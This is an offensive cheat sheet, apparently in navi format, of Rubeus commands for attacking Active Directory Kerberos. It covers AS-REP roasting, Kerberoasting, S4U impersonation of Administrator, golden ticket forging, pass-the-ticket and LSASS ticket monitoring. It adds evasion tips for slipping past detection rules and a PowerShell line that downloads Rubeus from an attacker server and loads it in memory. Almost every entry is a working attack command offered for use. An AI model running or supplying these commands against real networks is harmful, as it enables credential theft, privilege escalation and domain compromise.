# Rubeus

## Rubeus - asreproast

### ASREPRoast user to file

ASREPRoast a single user and save the AS-REP hash to disk for offline cracking.

```sh title:"ASREPRoast one user, save hash to file"
.\Rubeus.exe asreproast /user:$user /domain:$domain /dc:$rhost_name /nowrap /outfile:hashes.txt
```
<!-- cheat
var user
var domain
var rhost_name
-->

### ASREPRoast hashcat format

Same single-user ASREPRoast but emit the hash already in hashcat 18200 format.

```sh title:"ASREPRoast one user in hashcat 18200 format"
.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
```
<!-- cheat
var user
-->

## Rubeus - kerberoast

### Kerberoast stats

Print Kerberoast stats only (account counts, encryption types) without requesting tickets. Quick scope check.

```sh title:"Print Kerberoast stats only, no tickets requested"
.\Rubeus.exe kerberoast /stats
```
<!-- cheat -->

### Kerberoast adminCount=1

Restrict roast to AdminSDHolder-protected accounts. Highest-value targets only.

```sh title:"Restrict roast to AdminSDHolder-protected users"
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
<!-- cheat -->

### Kerberoast one user

Targeted Kerberoast against a named user.

```sh title:"Targeted Kerberoast against named user"
.\Rubeus.exe kerberoast /user:$user /nowrap
```
<!-- cheat
var user
-->

### Kerberoast all SPNs

Bulk Kerberoast every SPN-enabled account in the domain.

```sh title:"Bulk Kerberoast every SPN-enabled account"
.\Rubeus.exe kerberoast /nowrap
```
<!-- cheat -->

### Kerberoast no preauth

Roast a target via the no-preauth path (DONT_REQ_PREAUTH set). Works without valid creds, given the target's SPN.

```sh title:"Roast via no-preauth path, no creds required"
.\Rubeus.exe kerberoast /nopreauth:$user /domain:$domain /spn:$spn /nowrap
```
<!-- cheat
var user
var domain
var spn
-->

### Kerberoast cross-domain

Targeted roast against a user in a specific domain (cross-trust scenarios).

```sh title:"Targeted roast across trust into specific domain"
.\Rubeus.exe kerberoast /user:$user /domain:$domain /nowrap
```
<!-- cheat
var user
var domain
-->

## Rubeus - asktgt

### TGT from RC4 + PTT

Request a TGT using the user's RC4 hash and inject it into the current session in one step.

```sh title:"Request TGT with RC4 hash and inject into session"
.\Rubeus.exe asktgt /rc4:$rc4_hash /user:$user /ptt
```
<!-- cheat
var rc4_hash
var user
-->

### TGT from password

Request a TGT with a cleartext password, output `.kirbi` (no PTT). Useful for relay-style flows where the ticket is consumed elsewhere.

```sh title:"Request TGT with password, no PTT (output .kirbi)"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

### TGT via PKINIT

PKINIT TGT request using a certificate (PFX) and its password. `/getcredentials` returns the user's NT hash.

```sh title:"PKINIT TGT via PFX cert + password, /getcredentials returns NT hash"
.\Rubeus.exe asktgt /user:$user /certificate:$certificate /password:"$pass" /domain:$domain /dc:$rhost_name /getcredentials /show /nowrap
```
<!-- cheat
var user
var certificate
var pass
var domain
var rhost_name
-->

## Rubeus - s4u

### S4U2Self impersonate user

S4U2Self with `/altservice` to forge a usable service ticket as another user, then PTT.

```sh title:"S4U2Self for impersonated user, PTT result"
.\Rubeus.exe s4u /self /nowrap /impersonateuser:$user /altservice:$service /ptt /ticket:$ticket
```
<!-- cheat
var user
var service
var ticket
-->

### S4U2Proxy admin

S4U2Proxy chain to forge a service ticket as administrator on the named SPN, using a controlled account's RC4 hash.

```sh title:"S4U2Proxy ticket as administrator on named SPN"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /altservice:$service /user:$user /rc4:$rc4_hash /ptt
```
<!-- cheat
var msdsspn
var service
var user
var rc4_hash
-->

### S4U admin no PTT

Same admin S4U chain but without PTT; gets you the ticket on disk for use elsewhere.

```sh title:"Admin S4U chain, no PTT, ticket to disk"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /domain:$domain /user:$user /rc4:$rc4_hash /nowrap
```
<!-- cheat
var msdsspn
var domain
var user
var rc4_hash
-->

### S4U2Self admin via altservice

S4U2Self/altservice trick that forges a usable Administrator service ticket from a controlled account's TGT.

```sh title:"S4U2Self altservice trick to forge admin service ticket"
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:$service /dc:$rhost_name /ptt /ticket:$ticket
```
<!-- cheat
var service
var rhost_name
var ticket
-->

### S4U2Proxy self user

S4U2Proxy where the impersonated user is the same controlled user; useful in RBCD chains.

```sh title:"S4U2Proxy self-impersonation, RBCD chain step"
.\Rubeus.exe s4u /user:$user /rc4:$rc4_hash /impersonateuser:$user /msdsspn:$msdsspn /ptt
```
<!-- cheat
var user
var rc4_hash
var msdsspn
-->

### Netonly cmd

Spawn cmd.exe under a net-only sacrificial logon. Lets you load tickets into a clean LUID without touching the host token.

```sh title:"Net-only cmd.exe under sacrificial LUID for ticket loading"
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
<!-- cheat -->

## Rubeus - ptt

### PTT from .kirbi

Inject a `.kirbi` ticket file into the current logon session.

```sh title:"Inject .kirbi ticket file into current session"
.\Rubeus.exe ptt /ticket:$ticket.kirbi
```
<!-- cheat
var ticket
-->

### PTT from base64

Inject a base64-encoded ticket into the current session. Avoids dropping a file on disk.

```sh title:"Inject base64-encoded ticket, no file on disk"
.\Rubeus.exe ptt /ticket:$ticket
```
<!-- cheat
var ticket
-->

### Triage tickets

List all tickets currently loaded in the session (LUID, target, encryption).

```sh title:"List all tickets in session (LUID/target/enc)"
.\Rubeus.exe triage
```
<!-- cheat -->

## Rubeus

### Dump tickets

Dump tickets for a specific LUID and service. Targeted variant of `triage` + extract.

```sh title:"Dump tickets for specific LUID and service"
.\Rubeus.exe dump /luid:$luid /service:$service /nowrap
```
<!-- cheat
var luid
var service
-->

### Golden ticket

Forge a golden TGT with optional extra-SIDs (cross-forest impersonation).

```sh title:"Forge golden TGT, optional extra-SIDs for cross-forest"
.\Rubeus.exe golden /rc4:$rc4_hash /domain:$domain /sid:$sid /sids:$sids /user:$user /ptt
```
<!-- cheat
var rc4_hash
var domain
var sid
var sids
var user
-->

### Watch for new TGTs

Monitor LSASS for new TGTs at a 5s interval. Used after coercing a target to a host you control to grab inbound tickets.

```sh title:"Watch LSASS for inbound TGTs every 5s"
.\Rubeus.exe monitor /interval:5 /nowrap
```
<!-- cheat -->

### Ask TGS

Request a TGS for a named service using an existing TGT and PTT.

```sh title:"Request TGS for named service from existing TGT"
.\Rubeus.exe asktgs /ticket:$ticket /service:$service /ptt
```
<!-- cheat
var ticket
var service
-->

### Renew ticket

Renew a TGT and inject it. Extends ticket lifetime when the original is about to expire.

```sh title:"Renew TGT and inject, extends ticket lifetime"
.\Rubeus.exe renew /ticket:$ticket /ptt
```
<!-- cheat
var ticket
-->

### TGS service substitution

Substitute the service in a TGS by rewriting the sname (silver ticket repurposing trick).

```sh title:"Rewrite sname to repurpose silver ticket for new service"
.\Rubeus.exe tgssub /ticket:$ticket /altservice:$service /nowrap
```
<!-- cheat
var ticket
var service
-->

### Hash password

Compute Kerberos keys (RC4, AES128, AES256) from a cleartext password for the specified user/domain.

```sh title:"Compute RC4/AES Kerberos keys from cleartext password"
.\Rubeus.exe hash /password:$pass /user:$user /domain:$domain
```
<!-- cheat
var pass
var user
var domain
-->

### Kerberoast RC4 only (OPSEC)

Skip AES-enabled accounts to avoid the 4769-A event ID flag that AES Kerberoasting raises in modern hunts.

```sh title:"Roast RC4-only accounts (skip noisy AES tickets)"
.\Rubeus.exe kerberoast /rc4opsec /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast AES only

Target AES-enabled accounts specifically. Slower to crack but bypasses some weak detection rules that only watch RC4.

```sh title:"Roast AES-only accounts (slower crack, lower RC4 telemetry)"
.\Rubeus.exe kerberoast /aes /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast specific user (simple)

Targeted roast in `/simple` output format - just the hash, no surrounding metadata.

```sh title:"Targeted roast in /simple hash-only output format"
.\Rubeus.exe kerberoast /user:$target_user /simple /outfile:$output_file
```
<!-- cheat
var target_user
var output_file
-->

## Rubeus - in-memory load

### Load from disk

Load Rubeus into the current PowerShell session via Reflection - no `Rubeus.exe` process spawn, runs in `powershell.exe`.

```powershell title:"Load Rubeus.exe into PS session via Reflection (no child process)"
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("$rubeus_path"))
```
<!-- cheat
var rubeus_path
-->

### Load from URL

Pull Rubeus from an attacker server and load into the current PS session - no disk drop.

```powershell title:"In-memory load Rubeus from attacker URL"
$data = (New-Object System.Net.WebClient).DownloadData('$scheme://$lhost:$lport/Rubeus.exe'); [System.Reflection.Assembly]::Load($data)
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Invoke loaded Rubeus

After loading via Reflection, call into Rubeus.Program directly.

```powershell title:"Invoke loaded Rubeus.Program with split args"
[Rubeus.Program]::Main("$rubeus_cmd".Split())
```
<!-- cheat
var rubeus_cmd
-->

